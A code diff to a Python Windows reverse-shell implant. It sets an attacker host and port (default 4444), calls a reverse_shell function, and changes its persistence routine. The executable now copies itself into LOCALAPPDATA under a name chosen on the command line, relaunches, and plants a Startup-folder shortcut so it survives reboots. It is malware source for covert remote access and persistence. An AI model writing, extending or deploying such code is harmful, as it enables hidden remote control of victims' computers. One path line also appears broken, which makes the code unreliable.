@@ -9,12 +9,15 @@ import shutil
 from pathlib import Path
 from win32com.client import Dispatch
 
-LHOST = os.environ.get("LHOST") or "192.168.0.104"
+FILE_NAME = "MyApp"
+
+LHOST = os.environ.get("LHOST") or "0.0.0.0"
 LPORT = int(os.environ.get("LPORT") or "4444")
 
-if len(sys.argv) == 3:
+if len(sys.argv) == 4:
     LHOST = sys.argv[1]
     LPORT = int(sys.argv[2])
+    FILE_NAME = sys.argv[3]
 
 
 
@@ -69,25 +72,42 @@ def reverse_shell(host: str, port: int):
 
 
 # For PyInstaller
-def add_to_startup_py_installer():
+def add_to_startup():
     if not getattr(sys, "frozen", False):
-        raise RuntimeError("Цей код потрібно запускати із зібраного PyInstaller .exe")
+        raise RuntimeError("This function must be executed from a PyInstaller executable.")
 
-    exe_path = str(Path(sys.executable).resolve())
+    # Directory where the application will be installed
+    app_dir = Path(os.environ["LOCALAPPDATA"]) / FILE_NAME
+    app_dir.mkdir(parents=True, exist_ok=True)
+
+    current_exe = Path(sys.executable).resolve()
+    target_exe = app_dir / FILE_NAME + ".exe"
+
+    # Copy the executable to the installation directory on first launch
+    if current_exe != target_exe:
+        shutil.copy2(current_exe, target_exe)
+
+        # Start the installed copy
+        subprocess.Popen([str(target_exe)])
+
+        # Exit the current process
+        sys.exit()
 
     startup = os.path.join(
         os.environ["APPDATA"],
         r"Microsoft\Windows\Start Menu\Programs\Startup"
     )
 
-    shortcut_path = os.path.join(startup, "MyApp.lnk")
+    shortcut_path = os.path.join(startup, FILE_NAME + ".lnk")
 
-    shell = Dispatch("WScript.Shell")
-    shortcut = shell.CreateShortCut(shortcut_path)
-    shortcut.TargetPath = exe_path
-    shortcut.WorkingDirectory = str(Path(exe_path).parent)
-    shortcut.IconLocation = exe_path
-    shortcut.Save()
+    # Create a startup shortcut if it doesn't already exist
+    if not os.path.exists(shortcut_path):
+        shell = Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(shortcut_path)
+        shortcut.TargetPath = str(target_exe)
+        shortcut.WorkingDirectory = str(app_dir)
+        shortcut.IconLocation = str(target_exe)
+        shortcut.Save()
     
 
 def add_to_startup_native():
@@ -99,7 +119,7 @@ def add_to_startup_native():
     python_exe = sys.executable
     script = str(Path(__file__).resolve())
 
-    shortcut_path = os.path.join(startup, "MyApp.lnk")
+    shortcut_path = os.path.join(startup, FILE_NAME + ".lnk")
 
     shell = Dispatch("WScript.Shell")
     shortcut = shell.CreateShortCut(shortcut_path)
